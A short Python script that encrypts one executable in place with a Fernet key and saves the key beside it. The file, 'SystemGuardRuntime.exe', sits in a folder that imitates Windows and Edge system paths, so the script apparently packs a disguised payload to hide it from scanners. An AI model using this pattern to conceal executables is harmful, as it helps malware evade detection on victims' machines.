import os
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(key):
    input_file = "C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe"
    fernet = Fernet(key)
    
    with open(input_file, 'rb') as file:
        file_data = file.read()
    
    encrypted_data = fernet.encrypt(file_data)

    with open(input_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

def save_key_to_file(key):
    with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt", 'wb') as key_file:
        key_file.write(key)

if __name__ == "__main__":
    key = generate_key()
    save_key_to_file(key)
    encrypt_file(key)
